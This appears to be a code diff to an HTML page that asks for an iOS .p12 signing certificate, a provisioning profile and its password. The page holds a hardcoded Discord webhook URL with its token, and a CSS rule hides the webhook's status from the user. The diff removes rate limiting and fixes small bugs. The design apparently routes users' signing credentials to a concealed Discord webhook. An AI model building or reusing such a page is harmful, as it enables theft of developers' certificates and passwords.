@@ -375,31 +375,6 @@
         .webhook-status {
             display: none; /* Hide webhook status completely */
         }
-        
-        /* Rate limiting styles */
-        .rate-limit-countdown {
-            font-weight: bold;
-            display: inline-block;
-            min-width: 24px;
-            text-align: center;
-            animation: pulse 0.5s infinite alternate;
-        }
-        
-        @keyframes pulse {
-            from { transform: scale(1); }
-            to { transform: scale(1.1); }
-        }
-        
-        @keyframes countdownFlip {
-            0% { transform: rotateX(0deg); }
-            50% { transform: rotateX(90deg); }
-            100% { transform: rotateX(0deg); }
-        }
-        
-        .flip-digit {
-            display: inline-block;
-            animation: countdownFlip 0.5s ease-in-out;
-        }
     </style>
 </head>
 <body>
@@ -584,15 +559,6 @@
             // Webhook URL
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
             
-            // Rate limiting variables
-            let requestTimes = [];
-            let isRateLimited = false;
-            let rateLimitTimeout = null;
-            let rateLimitCountdown = null;
-            const RATE_LIMIT_THRESHOLD = 5; // 5 requests
-            const RATE_LIMIT_WINDOW = 7000; // 7 seconds
-            const RATE_LIMIT_DURATION = 3000; // 3 seconds rate limit duration (changed from 10s to 3s)
-            
             // Sample entitlements data
             const sampleEntitlements = [
                 "Access Wi-Fi Information",
@@ -687,7 +653,7 @@
             
             // Enable submit button only when all fields are filled
             function updateSubmitButtonState() {
-                if (p12File && mobileprovisionFile && passwordInput.value && !isRateLimited) {
+                if (p12File && mobileprovisionFile && passwordInput.value) {
                     submitBtn.disabled = false;
                 } else {
                     submitBtn.disabled = true;
@@ -696,80 +662,8 @@
             
             passwordInput.addEventListener('input', updateSubmitButtonState);
             
-            // Check if user is rate limited
-            function checkRateLimit() {
-                const now = Date.now();
-                
-                // Filter requests within the time window
-                requestTimes = requestTimes.filter(time => now - time < RATE_LIMIT_WINDOW);
-                
-                // Add current request time
-                requestTimes.push(now);
-                
-                // Check if threshold is exceeded
-                if (requestTimes.length >= RATE_LIMIT_THRESHOLD) {
-                    isRateLimited = true;
-                    submitBtn.disabled = true;
-                    showRateLimitMessage();
-                    return true;
-                }
-                
-                return false;
-            }
-            
-            // Show rate limit message with countdown
-            function showRateLimitMessage() {
-                // Clear any existing timeouts
-                if (rateLimitTimeout) {
-                    clearTimeout(rateLimitTimeout);
-                }
-                if (rateLimitCountdown) {
-                    clearInterval(rateLimitCountdown);
-                }
-                
-                // Show error alert with countdown
-                const errorMessage = `Rate Limited: Try again in <span class="rate-limit-countdown">3</span> seconds`;
-                showAlert(errorAlert, errorMessage);
-                
-                // Start countdown animation
-                const countdownElement = errorAlert.querySelector('.rate-limit-countdown');
-                let countdown = 3;
-                
-                rateLimitCountdown = setInterval(() => {
-                    countdown--;
-                    
-                    if (countdown <= 0) {
-                        clearInterval(rateLimitCountdown);
-                        hideAlert(errorAlert);
-                        isRateLimited = false;
-                        updateSubmitButtonState();
-                        return;
-                    }
-                    
-                    // Add flip animation to countdown
-                    countdownElement.innerHTML = `<span class="flip-digit">${countdown}</span>`;
-                    
-                    // Reset animation for next number
-                    setTimeout(() => {
-                        countdownElement.textContent = countdown;
-                    }, 500);
-                    
-                }, 1000);
-                
-                // Set timeout to re-enable button
-                rateLimitTimeout = setTimeout(() => {
-                    isRateLimited = false;
-                    updateSubmitButtonState();
-                }, RATE_LIMIT_DURATION);
-            }
-            
             // Handle form submission
             submitBtn.addEventListener('click', async function() {
-                // Check rate limiting
-                if (checkRateLimit()) {
-                    return;
-                }
-                
                 // Reset alerts
                 hideAlert(errorAlert);
                 hideAlert(successAlert);
@@ -924,7 +818,7 @@
             }
             
             function readFileAsArrayBuffer(file) {
-                return new Promise((resolve, reject) {
+                return new Promise((resolve, reject) => {
                     const reader = new FileReader();
                     reader.onload = () => resolve(reader.result);
                     reader.onerror = reject;
@@ -958,7 +852,7 @@
             }
             
             function showAlert(alertElement, message) {
-                alertElement.innerHTML = message;
+                alertElement.textContent = message;
                 alertElement.style.display = 'block';
             }
             
